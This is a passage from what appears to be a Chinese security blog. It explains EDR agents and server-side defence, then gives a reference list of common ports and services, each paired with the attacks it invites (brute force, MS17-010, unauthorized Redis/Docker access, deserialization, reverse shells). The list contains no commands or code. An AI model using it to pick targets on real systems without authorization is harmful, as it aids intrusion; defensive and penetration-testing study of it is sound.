<p>当然了，edr很重要的一个特点（优点）就是更新威胁情报库、病毒识别库等这些特征库只需要更新在服务端，等客户段连接时可以设置自动同步更新的，一在网络情况理想的状况下这套方案时目前最佳的。</p>
<p>Edr产品在联动上是最佳拍档，尤其是和态势感知联查病毒木马，绝对省时省力很多，能节省下相当的一部分对数据包传输内容的研判，关于联动的详情可以看看鼠鼠公众号的另一篇文章：安全设备篇——态势感知，这里就不太展开了。</p>
<p>终端安全</p>
<p>前面提到过了，edr是以服务器为指令主体的，这一点上确实方便检测和排查，如果需要实际研判发现某台主机上存在病毒和木马需要查杀，在服务端直接下发指令即可，很是方便，终端分为个人主机和服务器方面：</p>
<p>①个人主机</p>
<p>个人主机方面要安装一个agent客户端，然后客户端会自己连接服务器（跟cs有点像啊，自己生成指向服务器的exe），也可自己指定到服务器地址和端口，这些就是操作上的细节了。用户自己也可以利用客户端进行个人电脑的木马病毒查杀、防护，日常使用中哪怕没有接入服务器端，客户端也是具备防护功能。</p>
<p>②服务器</p>
<p>服务器也是终端安全需要被照顾的一环，假设一个请求从用户到达服务器，正常来说会经过waf、边界防火墙、ips等外层安全设备，edr就是最后一道防线。正常来理解呢就是各道防护各司其职，waf拦截非法参数，防火墙隔离网络区域，ips主动拦截，edr基本就是当场杀软来用了。但是从我个人角度出发这也是edr的侧弱点，对个人主机来说主动防御是几乎唯一的需求，但对服务器来说这是很单一的侧向，edr关注的更多只是端点安全，而忽略了点到点之间线段的安全，这就像是你的快递在到菜鸟驿站之前如果被抢劫了，你也没辙，这就需要找个强大的派送员来“押镖”，这就引出了XDR。</p>
<h3 id="常见端口-1"><a href="#常见端口-1" class="headerlink" title="常见端口"></a>常见端口</h3><ol>
<li><code>端口：21 服务：FTP/TFTP/VSFTPD 总结：爆破/嗅探/溢出/后门</code></li>
<li><code>端口：22 服务：ssh远程连接 总结：爆破/openssh漏洞</code></li>
<li><code>端口：23 服务：Telnet远程连接 总结：爆破/嗅探/弱口令</code></li>
<li><code>端口：25 服务：SMTP邮件服务 总结：邮件伪造</code></li>
<li><code>端口：53 服务：DNS域名解析系统 总结：域传送/劫持/缓存投毒/欺骗</code></li>
<li><code>端口：67/68 服务：dhcp服务 总结：劫持/欺骗</code></li>
<li><code>端口：110 服务：pop3 总结：爆破/嗅探</code></li>
<li><code>端口：139 服务：Samba服务 总结：爆破/未授权访问/远程命令执行</code></li>
<li><code>端口：143 服务：Imap协议 总结：爆破161SNMP协议爆破/搜集目标内网信息</code></li>
<li><code>端口：389 服务：Ldap目录访问协议 总结：注入/未授权访问/弱口令</code></li>
<li><code>端口：445 服务：smb 总结：ms17-010/端口溢出</code></li>
<li><code>端口：512/513/514 服务：Linux Rexec服务 总结：爆破/Rlogin登陆</code></li>
<li><code>端口：873 服务：Rsync服务 总结：文件上传/未授权访问</code></li>
<li><code>端口：1080 服务：socket 总结：爆破</code></li>
<li><code>端口：1352 服务：Lotus domino邮件服务 总结：爆破/信息泄漏</code></li>
<li><code>端口：1433 服务：mssql 总结：爆破/注入/SA弱口令</code></li>
<li><code>端口：1521 服务：oracle 总结：爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当</code></li>
<li><code>端口：2181 服务：zookeeper服务 总结：未授权访问</code></li>
<li><code>端口：2375 服务：docker remote api 总结：未授权访问</code></li>
<li><code>端口：3306 服务：mysql 总结：爆破/注入</code></li>
<li><code>端口：3389 服务：Rdp远程桌面链接 总结：爆破/shift后门</code></li>
<li><code>端口：4848 服务：GlassFish控制台 总结：爆破/认证绕过</code></li>
<li><code>端口：5000 服务：sybase/DB2数据库 总结：爆破/注入/提权</code></li>
<li><code>端口：5432 服务：postgresql 总结：爆破/注入/缓冲区溢出</code></li>
<li><code>端口：5632 服务：pcanywhere服务 总结：抓密码/代码执行</code></li>
<li><code>端口：5900 服务：vnc 总结：爆破/认证绕过</code></li>
<li><code>端口：6379 服务：Redis数据库 总结：未授权访问/爆破</code></li>
<li><code>端口：7001/7002 服务：weblogic 总结：java反序列化/控制台弱口令</code></li>
<li><code>端口：80/443 服务：http/https 总结：web应用漏洞/心脏滴血</code></li>
<li><code>端口：8069 服务：zabbix服务 总结：远程命令执行/注入</code></li>
<li><code>端口：8161 服务：activemq 总结：弱口令/写文件</code></li>
<li><code>端口：8080/8089 服务：Jboss/Tomcat/Resin 总结：爆破/PUT文件上传/反序列化</code></li>
<li><code>端口：8083/8086 服务：influxDB 总结：未授权访问</code></li>
<li><code>端口：9000 服务：fastcgi 总结：远程命令执行</code></li>
<li><code>端口：9090 服务：Websphere 总结：控制台爆破/java反序列化/弱口令</code></li>
<li><code>端口：9200/9300 服务：elasticsearch 总结：远程代码执行</code></li>
<li><code>端口：11211 服务：memcached 总结：未授权访问</code></li>
<li><code>端口：27017/27018 服务：mongodb 总结：未授权访问/爆破</code></li>
</ol>

    </div>

    <!-- 返回主页链接 -->
    <div class="text-center my-8">
        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
    </div>

    <footer class="bg-black text-gray-400 py-4">
    <div class="container mx-auto text-center">
      <p>© <span id="current-year"></span>  Red Fish 
        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
    </div>
  </footer>
  
  <script> 
    document.getElementById("current-year").textContent = new Date().getFullYear();
  </script>
  


</body>
</html>
